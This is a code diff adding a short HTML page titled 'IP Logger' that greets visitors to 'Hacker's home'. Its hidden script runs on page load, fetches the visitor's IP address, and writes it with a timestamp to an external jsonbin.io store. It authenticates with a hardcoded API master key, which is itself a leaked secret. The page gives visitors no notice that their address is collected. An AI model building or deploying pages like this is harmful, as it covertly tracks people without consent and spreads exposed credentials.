@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>Welcome</h1>
+    <p>Welcome to Hacker's home!!!</p>
+
+    <script>
+        // 获取用户的IP地址
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipData = {
+                ip: data.ip,
+                timestamp: new Date().toISOString()
+            };
+
+            // 首先获取当前的Bin内容
+            fetch('https://api.jsonbin.io/v3/b/66c1813ce41b4d34e421d9eb/latest', {
+                headers: {
+                    'X-Master-Key': '$2a$10$NiuNFfv3f3iLmY8Qgzu6b.33bU.s0EZQ7YGskJ/ghX8LQoLrGCy9q'
+                }
+            })
+            .then(response => response.json())
+            .then(bin => {
+                const currentIps = bin.record.ips || [];
+                currentIps.push(ipData);
+
+                // 更新Bin内容
+                fetch('https://api.jsonbin.io/v3/b/66c1813ce41b4d34e421d9eb', {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': '$2a$10$NiuNFfv3f3iLmY8Qgzu6b.33bU.s0EZQ7YGskJ/ghX8LQoLrGCy9q'
+                    },
+                    body: JSON.stringify({ ips: currentIps })
+                })
+                .then(response => response.json())
+                .then(updatedBin => console.log('IP logged successfully:', updatedBin))
+                .catch(error => console.error('Error logging IP:', error));
+            });
+        });
+    </script>
+</body>
+</html>
